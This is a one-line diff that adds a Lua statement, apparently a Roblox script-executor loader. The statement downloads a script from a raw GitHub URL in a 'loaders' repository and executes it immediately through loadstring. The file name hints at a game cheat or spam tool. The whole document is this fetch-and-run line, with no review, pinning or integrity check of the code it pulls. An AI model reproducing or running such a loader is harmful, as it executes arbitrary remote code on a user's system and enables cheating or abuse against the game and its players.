@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/runaways-beta-spam2-7ikup9vjiee3jw.lua"))()
